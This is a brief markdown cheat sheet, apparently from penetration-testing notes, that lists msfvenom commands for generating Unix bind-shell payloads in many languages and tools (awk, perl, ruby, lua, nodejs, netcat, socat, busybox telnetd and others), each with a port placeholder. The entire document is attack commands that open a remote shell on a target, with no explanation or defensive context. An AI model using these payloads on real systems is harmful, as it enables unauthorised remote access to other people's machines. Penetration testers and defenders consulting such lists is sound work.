# Bind Shells

## Awk

`$ msfvenom -p cmd/unix/bind_awk lport=<PORT>`

## Busybox

`$ msfvenom -p cmd/unix/bind_busybox_telnetd lport=<PORT>`

## Perl

`$ msfvenom -p cmd/unix/bind_perl lport=<PORT>`

`$ msfvenom -p cmd/unix/bind_perl_ipv6 lport=<PORT>`

## Zsh

`$ msfvenom -p cmd/unix/bind_zsh lport=<PORT>`

## Ruby

`$ msfvenom -p cmd/unix/bind_ruby lport=<PORT>`

`$ msfvenom -p cmd/unix/bind_ruby_ipv6 lport=<PORT>`

## Java

`$ msfvenom -p cmd/unix/bind_jjs lport=<PORT>`

## Lua

`$ msfvenom -p cmd/unix/bind_lua lport=<PORT>`

## NodeJS

`$ msfvenom -p cmd/unix/bind_nodejs lport=<PORT>`

## R

`$ msfvenom -p cmd/unix/bind_r lport=<PORT>`

## Netcat

### OpenBSD Method

`$ msfvenom -p cmd/unix/bind_netcat lport=<PORT>`

### Traditional GNU Method

`$ msfvenom -p cmd/unix/bind_netcat_gaping lport=<PORT>`

`$ msfvenom -p cmd/unix/bind_netcat_gaping_ipv6 lport=<PORT>`

`$ msfvenom -p cmd/unix/pingback_bind lport=<PORT>`

## Socat

`$ msfvenom -p cmd/unix/bind_socat_udp lport=<PORT>`

## Telnet

`$ msfvenom -p cmd/unix/bind_inetd lport=<PORT>`